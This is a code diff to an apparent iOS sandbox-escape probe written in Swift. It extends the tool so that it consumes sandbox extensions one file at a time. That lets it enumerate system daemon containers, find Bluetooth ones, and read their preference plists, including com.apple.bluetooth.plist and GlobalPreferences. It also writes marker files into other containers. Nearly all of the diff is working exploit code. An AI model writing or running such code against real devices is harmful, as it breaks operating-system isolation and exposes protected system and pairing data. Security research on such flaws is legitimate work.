@@ -337,6 +337,27 @@ final class A2DPProbe: ObservableObject {
                     self.findings.append(f)
                 }
             }
+            // Identify daemon containers via per-file metadata reads, then
+            // read every plist in identified bluetooth containers.
+            for root in [A2DPProbeRoot.systemData, .internalDaemon, .systemGroup] {
+                let found = await self.enumerate(root: root)
+                let hits = await self.identifyBluetooth(in: found)
+                if hits.isEmpty { continue }
+                for hit in hits {
+                    self.append("bluetooth container: \(hit.id) → \(hit.path)")
+                    let prefsDir = hit.path + "/Library/Preferences"
+                    var readCount = 0
+                    for entry in self.listDir(prefsDir) {
+                        guard readCount < 40 else { break }
+                        let child = prefsDir + "/" + entry
+                        let pf = self.read(child)
+                        if pf.readable {
+                            self.findings.append(pf)
+                            readCount += 1
+                        }
+                    }
+                }
+            }
             self.append("Probe finished — \(self.findings.count) findings")
             self.running = false
         }
@@ -394,6 +415,20 @@ final class A2DPProbe: ObservableObject {
         return text
     }
 
+    /// Read a file through its OWN extension. Directory extensions do not
+    /// cover child files (device-verified: dir listing OK, child open EPERM),
+    /// so every file read needs a per-path consume. -255 (lstat invisible)
+    /// is retried with create_dir=true, which skips the existence check.
+    func readFileData(_ target: String) -> Data? {
+        var handle = consumeFor(target)
+        if handle == -255 {
+            handle = consumeFor(target, createDir: true)
+        }
+        guard handle > 0 else { return nil }
+        defer { SandboxExtensionRelease(handle) }
+        return try? Data(contentsOf: URL(fileURLWithPath: target))
+    }
+
     enum ContainerClass {
         case identifier(String)
         case bluetoothPrefs
@@ -406,20 +441,9 @@ final class A2DPProbe: ObservableObject {
     ///  2. `.com.apple.containermanagerd.metadata.plist` (MCMMetadataIdentifier),
     ///  3. fallback: presence of `Library/Preferences/com.apple.bluetooth.plist`.
     func classify(_ target: String) -> ContainerClass {
-        let handle = consumeFor(target)
-        guard handle > 0 else { return .inaccessible }
-        defer { SandboxExtensionRelease(handle) }
-
-        var buf = [CChar](repeating: 0, count: 512)
-        let len = getxattr(target, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
-        if len > 0 {
-            return .identifier(String(cString: buf))
-        }
-
-        // Canonical metadata file (visible in container listings):
-        // .com.apple.mobile_container_manager.metadata.plist
+        // Per-file extension reads (directory extensions don't cover children).
         let metadataPath = target + "/.com.apple.mobile_container_manager.metadata.plist"
-        if let data = try? Data(contentsOf: URL(fileURLWithPath: metadataPath)),
+        if let data = readFileData(metadataPath),
            let plist = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil) as? [String: Any] {
             if let ident = plist["MCMMetadataIdentifier"] as? String {
                 return .identifier(ident)
@@ -430,8 +454,8 @@ final class A2DPProbe: ObservableObject {
             }
         }
 
-        let pref = target + "/Library/Preferences/com.apple.bluetooth.plist"
-        if FileManager.default.fileExists(atPath: pref) {
+        if let data = readFileData(target + "/Library/Preferences/com.apple.bluetooth.plist") {
+            _ = data
             return .bluetoothPrefs
         }
         return .unknown
@@ -518,25 +542,27 @@ final class A2DPProbe: ObservableObject {
             append("listing FAILED errno=\(errno)")
         }
 
-        var buf = [CChar](repeating: 0, count: 512)
-        let len = getxattr(path, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
-        if len > 0 {
-            append("xattr ok: \(String(cString: buf))")
-        } else {
-            append("xattr failed len=\(len) errno=\(errno) (93=ENOATTR 13=EACCES 1=EPERM)")
-        }
-
+        // Per-file extension reads (the dir extension above does NOT cover
+        // child files — that asymmetry is what earlier runs misread as
+        // "reads denied").
         let meta = path + "/.com.apple.mobile_container_manager.metadata.plist"
-        if let data = try? Data(contentsOf: URL(fileURLWithPath: meta)),
-           let plist = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil) as? [String: Any] {
-            append("metadata READ ok (\(data.count) bytes): "
-                   + plist.map { "\($0.key)=\($0.value)" }.sorted().joined(separator: ", "))
+        if let data = readFileData(meta) {
+            if let plist = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil) as? [String: Any] {
+                append("metadata READ ok (\(data.count) bytes): "
+                       + plist.map { "\($0.key)=\($0.value)" }.sorted().joined(separator: ", "))
+            } else {
+                append("metadata READ ok (\(data.count) bytes) but unparsable")
+            }
         } else {
-            diagnoseOpen(meta, label: "metadata plist")
+            append("metadata read failed even via per-file extension")
         }
 
         let gp = path + "/Library/Preferences/.GlobalPreferences.plist"
-        diagnoseOpen(gp, label: "GlobalPreferences")
+        if let data = readFileData(gp) {
+            append("GlobalPreferences read ok (\(data.count) bytes)")
+        } else {
+            append("GlobalPreferences: absent or unreadable")
+        }
 
         let marker = path + "/.bfw_" + String(UUID().uuidString.prefix(8))
         if FileManager.default.createFile(atPath: marker, contents: Data("x".utf8)) {
@@ -546,30 +572,11 @@ final class A2DPProbe: ObservableObject {
             append("write refused inside container")
         }
 
-        // Direct-file extension: the escape can also target a file path.
         let prefTarget = path + "/Library/Preferences/com.apple.bluetooth.plist"
-        let fileHandle = consumeFor(prefTarget)
-        if fileHandle > 0 {
-            let readable = (try? Data(contentsOf: URL(fileURLWithPath: prefTarget))) != nil
-            append("direct-file extension for bluetooth.plist: handle ok, readable=\(readable)")
-            SandboxExtensionRelease(fileHandle)
+        if let data = readFileData(prefTarget) {
+            append("bluetooth.plist read ok (\(data.count) bytes)")
         } else {
-            append("direct-file extension for bluetooth.plist: refused (see log above)")
-        }
-    }
-
-    private func diagnoseOpen(_ path: String, label: String) {
-        let fd = open(path, O_RDONLY)
-        if fd >= 0 {
-            var tmp = stat()
-            var size: Int64 = 0
-            if fstat(fd, &tmp) == 0 { size = Int64(tmp.st_size) }
-            close(fd)
-            append("\(label) open ok: \(size) bytes")
-        } else if errno == 2 {
-            append("\(label) open failed errno=2 ENOENT (file absent — access itself works)")
-        } else {
-            append("\(label) open failed errno=\(errno) (2=ENOENT 13=EACCES 1=EPERM)")
+            append("bluetooth.plist: absent or unreadable here")
         }
     }
 
